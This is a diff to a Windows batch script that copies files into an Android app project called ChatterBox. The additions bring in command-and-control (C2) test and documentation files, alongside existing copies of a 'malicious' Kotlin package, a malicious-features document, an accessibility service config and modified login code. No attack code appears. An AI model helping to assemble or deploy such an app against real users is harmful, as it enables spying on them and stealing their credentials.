@@ -12,6 +12,12 @@ mkdir "%DEST_DIR%\app\src\main\res\xml" 2>nul
 copy /Y "%SOURCE_DIR%\app\src\main\java\com\example\ChatterBox\malicious\*.kt" "%DEST_DIR%\app\src\main\java\com\example\ChatterBox\malicious\"
 copy /Y "%SOURCE_DIR%\app\src\main\java\com\example\ChatterBox\malicious\README.md" "%DEST_DIR%\app\src\main\java\com\example\ChatterBox\malicious\"
 
+:: Create test directory if it doesn't exist
+mkdir "%DEST_DIR%\app\src\test\java\com\example\ChatterBox" 2>nul
+
+:: Copy C2 test files
+copy /Y "%SOURCE_DIR%\app\src\test\java\com\example\ChatterBox\C2ConfigTest.kt" "%DEST_DIR%\app\src\test\java\com\example\ChatterBox\"
+
 :: Copy modified activity files
 copy /Y "%SOURCE_DIR%\app\src\main\java\com\example\ChatterBox\MainActivity.kt" "%DEST_DIR%\app\src\main\java\com\example\ChatterBox\"
 copy /Y "%SOURCE_DIR%\app\src\main\java\com\example\ChatterBox\LoginActivity.kt" "%DEST_DIR%\app\src\main\java\com\example\ChatterBox\"
@@ -23,6 +29,7 @@ copy /Y "%SOURCE_DIR%\app\src\main\res\xml\accessibility_service_config.xml" "%D
 :: Copy documentation
 copy /Y "%SOURCE_DIR%\MALICIOUS_FEATURES.md" "%DEST_DIR%\"
 copy /Y "%SOURCE_DIR%\README.md" "%DEST_DIR%\"
+copy /Y "%SOURCE_DIR%\C2_IMPLEMENTATION.md" "%DEST_DIR%\"
 
 echo Files copied successfully! 
 echo IMPORTANT: You need to manually update your AndroidManifest.xml file to include the new permissions and services.
